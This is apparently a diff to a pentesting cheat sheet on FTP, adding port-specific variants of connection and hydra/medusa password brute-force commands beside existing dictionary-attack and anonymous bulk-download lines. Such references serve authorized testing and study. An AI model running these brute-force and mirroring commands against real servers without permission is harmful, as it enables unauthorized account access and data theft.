@@ -3,6 +3,7 @@
 ```shell
 ftp $target
 ftp usuario@$target
+ftp $target <PORT>
 ```
 
 ```shell
@@ -20,7 +21,9 @@ nc -nv $target 21
 search auxiliary/scanner/ftp/
 # dictionary attack
 hydra -l usuario -P $rockyou $target ftp
+hydra -L users.list -P passwords.list ftp://$target:<port>
 medusa -u usuario -P $rockyou -h $target -M ftp 
+medusa -u usuario -P $rockyou -h $target -M ftp -n <port>
 # download All Available Files
 wget -m --no-passive ftp://anonymous:anonymous@$target
 ```
